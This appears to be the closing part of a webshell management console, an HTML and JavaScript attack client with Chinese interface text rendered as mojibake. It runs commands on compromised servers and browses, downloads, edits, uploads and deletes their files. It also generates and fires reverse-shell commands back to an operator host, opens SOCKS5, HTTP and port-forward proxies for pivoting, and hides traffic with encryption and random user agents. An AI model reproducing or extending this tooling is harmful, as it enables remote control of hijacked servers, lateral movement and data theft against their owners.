                appendTerminalOutput('[-] è¯·å…ˆè¿æ¥ä¸€ä¸ª Shell', 'error');
                return;
            }

            input.value = '';
            const prompt = document.getElementById('terminalPrompt').textContent;
            appendTerminalOutput(`${prompt}${cmd}`);

            WebshellTerminal.addToHistory(cmd);

            const result = await WebshellCore.executeCommand(shell, cmd);
            if (result.success) {
                appendTerminalOutput(result.output);
                // æ›´æ–° cwd
                if (cmd.startsWith('cd ')) {
                    WebshellTerminal.updateCwd(result.output.trim());
                    updatePrompt();
                }
                // æ›´æ–°åºåˆ—å·
                document.getElementById('sequenceNum').textContent = shell.crypto?.sequence || 0;
            } else {
                appendTerminalOutput(`[-] ${result.output}`, 'error');
            }
        }

        // æ–‡ä»¶ç®¡ç†
        async function refreshFileList() {
            const shell = WebshellCore.getActiveShell();
            if (!shell) return;

            const path = document.getElementById('currentPath').value;
            const files = await WebshellCore.fileOps.list(shell, path);

            const tbody = document.getElementById('fileTableBody');
            if (files.length === 0) {
                tbody.innerHTML = '<tr><td colspan="5" class="p-4 text-center text-slate-600">ç›®å½•ä¸ºç©ºæˆ–è¯»å–å¤±è´¥</td></tr>';
                return;
            }

            // æ’åºï¼šç›®å½•ä¼˜å…ˆ
            files.sort((a, b) => {
                if (a.type === 'dir' && b.type !== 'dir') return -1;
                if (a.type !== 'dir' && b.type === 'dir') return 1;
                return a.name.localeCompare(b.name);
            });

            tbody.innerHTML = files.map(f => `
                <tr class="border-b border-slate-800 hover:bg-slate-800/50">
                    <td class="p-2">
                        <span class="mr-2">${f.icon}</span>
                        <span class="${f.type === 'dir' ? 'text-blue-400 cursor-pointer hover:underline' : ''}"
                              ${f.type === 'dir' ? `onclick="enterDir('${f.name}')"` : ''}>${f.name}</span>
                    </td>
                    <td class="p-2 text-right text-slate-400">${f.type === 'dir' ? '-' : WebshellFileManager.formatFileSize(f.size)}</td>
                    <td class="p-2 text-right text-slate-500">${WebshellFileManager.formatTimestamp(f.mtime)}</td>
                    <td class="p-2 text-right text-slate-500">${f.perm}</td>
                    <td class="p-2 text-center">
                        ${f.type !== 'dir' ? `<button onclick="downloadFile('${f.name}')" class="text-blue-400 hover:text-blue-300 text-[10px] mr-1">ä¸‹è½½</button>
                        <button onclick="editFile('${f.name}')" class="text-yellow-400 hover:text-yellow-300 text-[10px] mr-1">ç¼–è¾‘</button>` : ''}
                        <button onclick="deleteFile('${f.name}')" class="text-red-400 hover:text-red-300 text-[10px]">åˆ é™¤</button>
                    </td>
                </tr>
            `).join('');

            // æ›´æ–°åºåˆ—å·
            document.getElementById('sequenceNum').textContent = shell.crypto?.sequence || 0;
        }

        function goToParentDir() {
            const path = document.getElementById('currentPath').value;
            const parts = path.split('/').filter(p => p);
            parts.pop();
            document.getElementById('currentPath').value = '/' + parts.join('/');
            refreshFileList();
        }

        function enterDir(name) {
            const path = document.getElementById('currentPath').value;
            document.getElementById('currentPath').value = path === '/' ? '/' + name : path + '/' + name;
            refreshFileList();
        }

        async function downloadFile(name) {
            const shell = WebshellCore.getActiveShell();
            if (!shell) return;
            const path = document.getElementById('currentPath').value;
            const fullPath = path === '/' ? '/' + name : path + '/' + name;
            await WebshellFileManager.downloadFileChunked(fullPath, {
                execute: async (payload) => {
                    const result = await WebshellCore.sendRequest(shell, payload);
                    return result.data;
                }
            });
        }

        function editFile(name) {
            const path = document.getElementById('currentPath').value;
            const fullPath = path === '/' ? '/' + name : path + '/' + name;
            // ç®€å•ç¼–è¾‘åŠŸèƒ½
            const shell = WebshellCore.getActiveShell();
            if (shell) {
                WebshellCore.fileOps.read(shell, fullPath).then(result => {
                    if (result.success) {
                        const newContent = prompt('ç¼–è¾‘æ–‡ä»¶å†…å®¹:', result.data);
                        if (newContent !== null && newContent !== result.data) {
                            WebshellCore.fileOps.write(shell, fullPath, newContent).then(() => {
                                alert('ä¿å­˜æˆåŠŸ');
                                refreshFileList();
                            });
                        }
                    }
                });
            }
        }

        async function deleteFile(name) {
            if (!confirm(`ç¡®å®šåˆ é™¤ ${name}?`)) return;
            const shell = WebshellCore.getActiveShell();
            if (!shell) return;
            const path = document.getElementById('currentPath').value;
            const fullPath = path === '/' ? '/' + name : path + '/' + name;
            await WebshellCore.fileOps.delete(shell, fullPath);
            refreshFileList();
        }

        function showUploadModal() {
            const input = document.createElement('input');
            input.type = 'file';
            input.onchange = async (e) => {
                const file = e.target.files[0];
                if (file) {
                    const shell = WebshellCore.getActiveShell();
                    if (shell) {
                        const path = document.getElementById('currentPath').value;
                        const fullPath = path === '/' ? '/' + file.name : path + '/' + file.name;
                        appendTerminalOutput(`[*] ä¸Šä¼ ä¸­: ${file.name} (${WebshellFileManager.formatFileSize(file.size)})`, 'info');
                        await WebshellCore.fileOps.upload(shell, file, fullPath, (progress) => {
                            appendTerminalOutput(`[*] è¿›åº¦: ${progress.percent}%`, 'info');
                        });
                        appendTerminalOutput(`[+] ä¸Šä¼ å®Œæˆ!`, 'success');
                        refreshFileList();
                    }
                }
            };
            input.click();
        }

        function showMkdirModal() {
            const name = prompt('ç›®å½•åç§°:');
            if (name) {
                const shell = WebshellCore.getActiveShell();
                if (shell) {
                    const path = document.getElementById('currentPath').value;
                    const fullPath = path === '/' ? '/' + name : path + '/' + name;
                    WebshellCore.fileOps.mkdir(shell, fullPath).then(() => refreshFileList());
                }
            }
        }

        // åå¼¹ Shell
        function generateReverseShell() {
            const type = document.getElementById('reverseType').value;
            const ip = document.getElementById('reverseIp').value || window.location.hostname;
            const port = document.getElementById('reversePort').value || '4444';

            const cmd = WebshellReverse.generateShellCommand(type, ip, port);
            document.getElementById('reverseCommand').textContent = cmd;

            // æ·»åŠ åˆ°å†å²
            WebshellReverse.addReverseShell({ type, ip, port });
            updateReverseHistory();
        }

        function updateReverseHistory() {
            const history = WebshellReverse.getReverseShells();
            const el = document.getElementById('reverseHistory');

            if (history.length === 0) {
                el.innerHTML = '<div class="text-slate-600 text-xs text-center py-4">æš‚æ— è®°å½•</div>';
                return;
            }

            el.innerHTML = history.slice(-10).reverse().map(h => `
                <div class="bg-slate-800 rounded p-2 text-xs">
                    <div class="flex justify-between items-center">
                        <span class="text-slate-400">${h.type}</span>
                        <span class="text-slate-500">${new Date(h.createdAt).toLocaleString()}</span>
                    </div>
                    <code class="text-green-400 block mt-1 break-all">${h.command}</code>
                </div>
            `).join('');
        }

        async function executeReverseShell() {
            const shell = WebshellCore.getActiveShell();
            if (!shell) {
                alert('è¯·å…ˆè¿æ¥ä¸€ä¸ª Shell');
                return;
            }
            const cmd = document.getElementById('reverseCommand').textContent;
            if (!cmd || cmd.includes('é€‰æ‹©ç±»å‹')) {
                alert('è¯·å…ˆç”Ÿæˆåå¼¹å‘½ä»¤');
                return;
            }
            appendTerminalOutput(`[*] æ­£åœ¨æ‰§è¡Œåå¼¹ Shell...`, 'info');
            const result = await WebshellCore.executeCommand(shell, cmd);
            appendTerminalOutput(result.success ? '[+] å‘½ä»¤å·²å‘é€' : `[-] æ‰§è¡Œå¤±è´¥: ${result.output}`, result.success ? 'success' : 'error');
        }

        function copyReverseCommand() {
            const cmd = document.getElementById('reverseCommand').textContent;
            navigator.clipboard.writeText(cmd);
            alert('å·²å¤åˆ¶');
        }

        function copyListenerCommand() {
            const port = document.getElementById('reversePort').value || '4444';
            const cmd = WebshellReverse.getListenerCommand(port);
            navigator.clipboard.writeText(cmd);
            alert(`å·²å¤åˆ¶ç›‘å¬å‘½ä»¤: ${cmd}`);
        }

        // ä»£ç†
        let currentProxyMode = 'forward';

        function setProxyMode(mode) {
            currentProxyMode = mode;

            // æ›´æ–°æŒ‰é’®çŠ¶æ€
            document.querySelectorAll('.proxy-mode-btn').forEach(btn => {
                btn.classList.remove('bg-cyan-600', 'text-white');
                btn.classList.add('bg-slate-700', 'text-slate-300');
            });
            document.getElementById(`proxyMode${mode.charAt(0).toUpperCase() + mode.slice(1)}`).classList.remove('bg-slate-700', 'text-slate-300');
            document.getElementById(`proxyMode${mode.charAt(0).toUpperCase() + mode.slice(1)}`).classList.add('bg-cyan-600', 'text-white');

            // åˆ‡æ¢é…ç½®é¢æ¿
            document.getElementById('proxyForwardConfig').classList.toggle('hidden', mode === 'single');
            document.getElementById('proxySingleConfig').classList.toggle('hidden', mode !== 'single');
        }

        async function startProxyForward() {
            const shell = WebshellCore.getActiveShell();
            if (!shell) {
                alert('è¯·å…ˆè¿æ¥ä¸€ä¸ª Shell');
                return;
            }

            const localPort = parseInt(document.getElementById('proxyLocalPort').value) || 1080;
            const targetHost = document.getElementById('proxyTargetHost').value;
            const targetPort = parseInt(document.getElementById('proxyTargetPort').value);

            if (!targetHost || !targetPort) {
                alert('è¯·è¾“å…¥ç›®æ ‡ä¸»æœºå’Œç«¯å£');
                return;
            }

            addProxyLog(`æ­£åœ¨å¯åŠ¨ä»£ç†: ${localPort} -> ${targetHost}:${targetPort}`, 'info');

            let result;
            if (currentProxyMode === 'forward') {
                result = await WebshellProxy.startPortForward(shell, localPort, targetHost, targetPort);
            } else if (currentProxyMode === 'socks5') {
                result = await WebshellProxy.startSocks5Proxy(shell, localPort);
            } else if (currentProxyMode === 'http') {
                result = await WebshellProxy.startHttpProxy(shell, localPort);
            }

            if (result.success) {
                addProxyLog(result.message || 'ä»£ç†å·²å¯åŠ¨', 'success');
                document.getElementById('startProxyBtn').classList.add('hidden');
                document.getElementById('stopProxyBtn').classList.remove('hidden');
                document.getElementById('proxyStatus').classList.remove('hidden');
                updateProxyStatus();
            } else {
                addProxyLog(`å¯åŠ¨å¤±è´¥: ${result.error}`, 'error');
            }
        }

        function stopProxyAction() {
            WebshellProxy.stopProxy();
            addProxyLog('ä»£ç†å·²åœæ­¢', 'info');
            document.getElementById('startProxyBtn').classList.remove('hidden');
            document.getElementById('stopProxyBtn').classList.add('hidden');
            document.getElementById('proxyStatus').classList.add('hidden');
        }

        async function sendSingleProxyRequest() {
            const shell = WebshellCore.getActiveShell();
            if (!shell) {
                alert('è¯·å…ˆè¿æ¥ä¸€ä¸ª Shell');
                return;
            }

            const host = document.getElementById('singleProxyHost').value;
            const port = parseInt(document.getElementById('singleProxyPort').value) || 80;
            const data = document.getElementById('singleProxyData').value;

            if (!host) {
                alert('è¯·è¾“å…¥ç›®æ ‡ä¸»æœº');
                return;
            }

            addProxyLog(`å‘é€è¯·æ±‚åˆ° ${host}:${port}`, 'info');

            const result = await WebshellProxy.sendProxyRequest(shell, host, port, data);

            if (result.success) {
                addProxyLog(`å“åº”æ”¶åˆ° (${result.data.length} bytes)`, 'success');
                document.getElementById('proxyResponseArea').classList.remove('hidden');
                document.getElementById('proxyResponse').textContent = result.data;
            } else {
                addProxyLog(`è¯·æ±‚å¤±è´¥: ${result.error}`, 'error');
            }

            updateProxyStatus();
        }

        function addProxyLog(message, type = 'info') {
            const logsEl = document.getElementById('proxyLogs');
            const colors = {
                'info': 'text-cyan-400',
                'success': 'text-green-400',
                'error': 'text-red-400',
                'warning': 'text-yellow-400'
            };

            const entry = document.createElement('div');
            entry.className = `${colors[type] || 'text-slate-400'}`;
            entry.innerHTML = `<span class="text-slate-600">[${new Date().toLocaleTimeString()}]</span> ${message}`;

            if (logsEl.querySelector('.text-center')) {
                logsEl.innerHTML = '';
            }
            logsEl.insertBefore(entry, logsEl.firstChild);
        }

        function clearProxyLogs() {
            document.getElementById('proxyLogs').innerHTML = '<div class="text-slate-600 text-center py-2">æš‚æ— æ—¥å¿—</div>';
            WebshellProxy.clearLogs();
        }

        function updateProxyStatus() {
            const status = WebshellProxy.getStatus();
            document.getElementById('proxyConnections').textContent = status.connections;

            const formatBytes = (bytes) => {
                if (bytes === 0) return '0 B';
                const k = 1024;
                const sizes = ['B', 'KB', 'MB', 'GB'];
                const i = Math.floor(Math.log(bytes) / Math.log(k));
                return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
            };

            document.getElementById('proxyBytesIn').textContent = formatBytes(status.bytesIn);
            document.getElementById('proxyBytesOut').textContent = formatBytes(status.bytesOut);
        }

        // ç³»ç»Ÿä¿¡æ¯
        async function refreshSystemInfo() {
            const shell = WebshellCore.getActiveShell();
            if (!shell) {
                document.getElementById('systemInfo').innerHTML = '<div class="text-slate-600 text-xs text-center py-4">è¯·å…ˆè¿æ¥ Shell</div>';
                return;
            }

            const info = await WebshellCore.getShellInfo(shell);
            if (info) {
                const infoHtml = Object.entries(info).map(([key, value]) => `
                    <div class="flex justify-between p-2 bg-slate-800 rounded">
                        <span class="text-slate-400 text-xs">${key}</span>
                        <span class="text-slate-200 text-xs font-mono">${value}</span>
                    </div>
                `).join('');
                document.getElementById('systemInfo').innerHTML = infoHtml;
            }
        }

        async function downloadPhpInfo() {
            const shell = WebshellCore.getActiveShell();
            if (!shell) {
                alert('è¯·å…ˆè¿æ¥ Shell');
                return;
            }
            appendTerminalOutput('[*] æ­£åœ¨è·å– phpinfo...', 'info');
            const result = await WebshellCore.getPhpInfo(shell);
            if (result.success) {
                // åœ¨ç»ˆç«¯æ˜¾ç¤ºphpinfoé“¾æ¥æˆ–ç›´æ¥æ˜¾ç¤º
                const htmlContent = result.data;
                // åˆ›å»ºæ–°çª—å£æ˜¾ç¤º
                const newWindow = window.open('', '_blank');
                if (newWindow) {
                    newWindow.document.write(htmlContent);
                    newWindow.document.close();
                } else {
                    // å¦‚æœå¼¹çª—è¢«é˜»æ­¢ï¼Œä¸‹è½½æ–‡ä»¶
                    const blob = new Blob([htmlContent], { type: 'text/html' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.href = url;
                    a.download = 'phpinfo.html';
                    a.click();
                    URL.revokeObjectURL(url);
                }
                appendTerminalOutput('[+] phpinfo å·²è·å–', 'success');
            } else {
                appendTerminalOutput('[-] è·å– phpinfo å¤±è´¥: ' + result.error, 'error');
            }
        }

        // é…ç½®
        function saveConfig() {
            const shell = WebshellCore.getActiveShell();
            if (shell) {
                shell.enableEncryption = document.getElementById('configEncryption').checked;
                shell.enableSign = document.getElementById('configSign').checked;
                shell.enablePadding = document.getElementById('configPadding').checked;
                shell.encoding = document.getElementById('configEncoding').value;
                shell.encoder = document.getElementById('configEncoder').value;
                shell.decoder = document.getElementById('configDecoder').value;
                shell.timeout = parseInt(document.getElementById('configTimeout').value);
                shell.userAgent = document.getElementById('configRandomUA').checked ? 'random' : 'default';
                WebshellCore.saveShells();
                updateCryptoStatus(shell.enableEncryption, shell);
                alert('é…ç½®å·²ä¿å­˜');
            }
        }

        // æ‰¹é‡æµ‹è¯•
        async function batchTestAll() {
            const shells = WebshellCore.getShells();
            if (shells.length === 0) {
                alert('æ²¡æœ‰ Shell å¯æµ‹è¯•');
                return;
            }
            appendTerminalOutput(`[*] å¼€å§‹æ‰¹é‡æµ‹è¯• ${shells.length} ä¸ª Shell...`, 'info');
            const results = await WebshellCore.batchTest(shells);
            const success = results.filter(r => r.success).length;
            appendTerminalOutput(`[*] æµ‹è¯•å®Œæˆ: ${success}/${shells.length} æˆåŠŸ`, success === shells.length ? 'success' : 'warning');
            refreshShellList();
        }

        // å¯¼å‡º
        function exportShells() {
            const shells = WebshellCore.getShells();
            if (shells.length === 0) {
                alert('æ²¡æœ‰ Shell å¯å¯¼å‡º');
                return;
            }
            const data = WebshellCore.exportShells('json');
            const blob = new Blob([data], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'webshells.json';
            a.click();
            URL.revokeObjectURL(url);
        }

        // å¯¼å…¥
        async function importShellsData() {
            const format = document.getElementById('importFormat').value;
            const data = document.getElementById('importData').value;
            if (!data) {
                alert('è¯·è¾“å…¥æ•°æ®');
                return;
            }
            const result = WebshellCore.importShells(data, format);
            if (result.success) {
                alert(`æˆåŠŸå¯¼å…¥ ${result.count} ä¸ª Shell`);
                hideImportModal();
                refreshShellList();
            } else {
                alert(`å¯¼å…¥å¤±è´¥: ${result.error}`);
            }
        }
    </script>
</body>
</html>
